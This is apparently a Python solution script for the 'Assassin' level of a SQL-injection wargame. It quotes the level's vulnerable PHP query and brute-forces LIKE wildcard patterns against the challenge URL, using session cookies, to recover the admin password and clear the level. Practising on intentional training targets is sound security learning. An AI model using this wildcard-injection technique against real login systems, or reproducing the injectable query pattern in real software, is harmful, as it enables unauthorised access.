#!/usr/bin/env python3
import los


def main():
    '''
    Assassin

    if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("assassin");
    '''

    url = "https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php"
    cook = los.check_cookies(url)

    allchars = 'abcdefghijklmnopqrstuvwxyz1234567890'
    find_char = []

    for char in allchars:
        param = dict(pw=f'%{char}%')
        response = los.get_request(url, param, cook)
        if 'Hello guest' in response:
            find_char.append(char)
        if len(find_char) == 2:
            break

    param = dict(pw=f'%{find_char[0]}%{find_char[1]}%')
    response = los.get_request(url, param, cook)
    if 'Clear!' in response:
        print('Assassin Clear!')
    else:
        param = dict(pw=f'%{find_char[1]}%{find_char[0]}%')
        response = los.get_request(url, param, cook)
        if 'Clear!' in response:
            print('Assassin Clear!')


if __name__ == '__main__':
    main()
